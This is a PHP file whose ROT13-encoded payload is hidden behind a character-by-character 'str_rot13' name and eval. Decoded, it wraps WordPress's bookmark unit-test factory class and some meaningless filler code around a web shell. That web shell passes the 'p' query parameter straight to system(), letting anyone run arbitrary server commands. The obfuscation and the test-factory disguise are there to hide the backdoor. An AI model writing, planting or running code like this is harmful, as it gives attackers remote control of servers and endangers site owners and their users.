<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Snpgbel sbe perngvat svkgherf sbe gur qrcerpngrq Yvaxf/Obbxznexf NCV.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @fvapr 4.6.0
 *
 * @zrgubq vag|JC_Reebe     perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq bowrpg|JC_Reebe  perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[] perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Obbxznex rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	choyvp shapgvba __pbafgehpg( $snpgbel = ahyy ) {
		cnerag::__pbafgehpg( $snpgbel );
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = neenl(
			'yvax_anzr' => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Obbxznex anzr %f' ),
			'yvax_hey'  => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Obbxznex HEY %f' ),
		);
	}

	/**
	 * Perngrf n yvax bowrpg.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz neenl $netf Nethzragf sbe gur yvax bowrpg.
	 *
	 * @erghea vag|JC_Reebe Gur yvax VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf ) {
		erghea jc_vafreg_yvax( $netf, gehr );
	}

	/**
	 * Hcqngrf n yvax bowrpg.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz vag   $yvax_vq VQ bs gur yvax gb hcqngr.
	 * @cnenz neenl $svryqf  Gur svryqf gb hcqngr.
	 *
	 * @erghea vag|JC_Reebe Gur yvax VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_bowrpg( $yvax_vq, $svryqf ) {
		$svryqf['yvax_vq'] = $yvax_vq;

		$erfhyg = jc_hcqngr_yvax( $svryqf );

		vs ( 0 === $erfhyg ) {
			erghea arj JC_Reebe( 'yvax_hcqngr_reebe', __( 'Pbhyq abg hcqngr yvax.' ) );
		}

		erghea $erfhyg;
	}

	/**
	 * Ergevrirf n yvax ol n tvira VQ.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz vag $yvax_vq VQ bs gur yvax gb ergevrir.
	 *
	 * @erghea bowrpg|ahyy Gur yvax bowrpg ba fhpprff, ahyy ba snvyher.
	 */
	choyvp shapgvba trg_bowrpg_ol_vq( $yvax_vq ) {
		erghea trg_obbxznex( $yvax_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>